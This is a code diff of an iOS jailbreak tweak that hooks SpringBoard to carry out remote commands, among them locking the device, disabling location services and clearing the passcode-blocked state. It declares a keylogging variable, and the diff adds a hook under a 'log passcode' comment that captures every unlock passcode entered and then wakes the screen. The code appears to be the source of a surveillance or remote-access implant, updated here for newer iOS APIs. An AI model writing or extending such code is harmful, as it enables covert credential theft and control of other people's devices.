@@ -46,7 +46,12 @@ NSString *keyLog;
 		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:-1];
 	}
 	else if ([name isEqual:@"home"]) {
-		[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
+		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
+			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
+		}
+		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(clickedMenuButton)]) {
+			[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
+		}
 	}
 	else if ([name isEqual:@"lock"]) {
 		[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
@@ -59,7 +64,12 @@ NSString *keyLog;
 		[self performSelector:@selector(initRecord) withObject:nil afterDelay:0];
 	}
 	else if ([name isEqual:@"doublehome"]) {
-		[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
+		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
+			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
+		}
+		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleMenuDoubleTap)]) {
+			[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
+		}
 	}
 	else if ([name isEqual:@"undisabled"]) {
 		[(SBDeviceLockController *)[%c(SBDeviceLockController) sharedController] _clearBlockedState];
@@ -81,9 +91,7 @@ NSString *keyLog;
     }
     else if ([name isEqual:@"locationoff"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:false];
-    }
-    
-    
+    }    
 }
 
 %new
@@ -130,6 +138,13 @@ NSString *keyLog;
 //log passcode
 
 %hook SBLockScreenManager
+-(void)attemptUnlockWithPasscode:(id)arg1 {
+	%orig;
+	passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
+	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
+	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
+}
+/* depricated
 -(BOOL)attemptUnlockWithPasscode:(id)arg1 {
 	bool success = %orig;
 	if ([[[NSString alloc] initWithFormat:@"%@", arg1] isEqual:@"1"]) {
@@ -140,6 +155,7 @@ NSString *keyLog;
 	}
 	return success;
 }
+*/
 %end
 
 @interface UIKBTree : NSObject
